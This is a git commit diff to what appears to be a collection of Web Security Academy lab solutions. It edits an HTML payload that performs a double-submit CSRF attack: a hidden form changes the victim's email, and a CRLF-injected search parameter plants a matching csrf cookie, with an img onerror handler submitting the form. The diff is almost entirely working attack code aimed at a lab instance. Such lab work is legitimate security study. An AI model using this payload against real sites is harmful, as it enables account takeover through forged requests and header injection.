cb8aa041848cf78faad12fb4ecbc55c28e8c6ff4
Pranjal <pranjalruhela2811@gmail.com>
2023-06-27 12:53:46 +0530

    double submit CSRF

--- CSRF/CSRF where token is duplicated in cookie/payload.js
+++ CSRF/CSRF where token is duplicated in cookie/payload.js
@@ -1,14 +1,14 @@
 <html>
-<body>
-    <form action="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/my-account/change-email" method="POST">
-        <input type="hidden" name="email" value="hacktube@tube.net"/>
-        <input type="hidden" name="csrf" value="abcd"/>
+    <body>
+        <form action="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
+        <input type="hidden" name="email" value="hackertube@tubeww.net">
+        <input type="hidden" name="csrf" value="test">
     </form>
-    <script>
-    <img src="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=abcd%3b%20SameSite=None" onerror="document.forms[0].submit()"/>
-    </script>
-</body>
-</html>?
+    
+    <img src="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit()">
+
+    </body>
+</html>
 /*
 
 find a injection point for csrf cookie
